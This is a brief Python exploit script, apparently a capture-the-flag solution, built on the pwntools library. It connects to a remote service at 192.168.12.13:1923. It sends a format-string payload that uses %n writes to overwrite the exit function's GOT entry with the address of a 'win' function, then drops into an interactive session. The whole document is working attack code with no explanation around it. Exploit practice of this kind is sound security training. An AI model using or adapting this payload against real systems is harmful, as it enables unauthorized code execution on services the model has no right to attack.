from pwn import *
from struct import *

exit_addr = 4210712
win_addr = 0x401156

ex = remote('192.168.12.13', 1923)

payload = (b"%86p%14$n%16315p%15$n").ljust(64, b"*")
payload += p64(exit_addr)
payload += p64(exit_addr+1)


ex.sendline(payload)

ex.interactive()
